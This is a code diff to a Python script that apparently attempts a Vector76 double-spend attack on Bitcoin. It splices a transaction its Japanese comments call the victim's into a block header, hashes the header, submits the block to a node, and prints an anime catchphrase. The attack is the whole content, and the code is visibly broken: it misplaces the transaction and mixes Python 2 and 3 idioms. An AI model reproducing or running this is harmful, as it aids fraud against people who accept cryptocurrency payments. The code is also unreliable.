@@ -112,17 +112,21 @@ def get_block_header_by_txid(txid):
     print(f"Version: {block_data.get('ver')}")
     return block_header
 
-def mine_block(block_header_V):
+def mine_vector76_block(block_header_V, inject_tx):
     version_hex    = format(block_header_V["Version"], "08x")[::-1]
+    #block_hex      = block_header_V["Block"][::-1]
+    #height_hex = format(block_header_V["Block Heihgt"], "x")[::-1]
     prev_block_hex = block_header_V["Prev Block"][::-1]
     markle_root_hex = block_header_V["Merkle Root"][::-1]
     timestamp_s = int((datetime.strptime(block_header_V["Mined Time"], "%Y-%m-%d %H:%M:%S")-datetime(1970,1,1)).total_seconds())
     timestamp_hex = format(timestamp_s,"x")[::-1]
     bits_hex  = format(block_header_V["Bits"], "x")[::-1]
     nonce_hex = format(block_header_V["Nonce"], "x")[::-1]
-    header = f"{version_hex}{prev_block_hex}{markle_root_hex}{timestamp_hex}{bits_hex}{nonce_hex}"
-    block_hash = sha256(sha256(header).digest()).digest()[::-1].encode("hex")
-    print(block_hash)
+
+    # 金融庁の資料によると、一つ目のトランザクションを含めてマイニンングするらしいが挿入する箇所はわかっていない。
+    vector76_blockheader = f"{version_hex}{prev_block_hex}{markle_root_hex}{timestamp_hex}{bits_hex}{inject_tx}{nonce_hex}"
+    block_hash = sha256(sha256(vector76_blockheader).digest()).digest()[::-1].encode("hex")
+    print(f"Block Hash : {block_hash}")
     return block_hash
 
 
@@ -182,16 +186,15 @@ print("T2 Pushed.")
 print("Request Blockheader...")
 block_header_V = get_block_header_by_txid(prev_txid)
 print("Mining Vector76 Block...")
-vector76_block = mine_block(block_header_V)
+vector76_block = mine_vector76_block(block_header_V, tx_victim) # 一つ目のトランザクション = 被害者あてのトランザクション?
 print(vector76_block)
 input("--- Send the block after pressing the enter key. --- ")
 print()
-print(f"submitblock {vector76_block}")
+print(f"Submitting Vector76 Block...   : {vector76_block}")
 print()
 result = rpc_node.submitblock(vector76_block)
-print("")
 print()#おまけ
-print(f"Kamijou Touma >> Kill that blockchain transaction!!")
+print(f"Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
 print()
 
 sound_name = "ImagineBreaker.mp3"
@@ -205,4 +208,6 @@ except:
     # Termux Only
     imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
     subprocess.run(imagine_breaker_cmd)
+
+print(result)
 print("Done.")
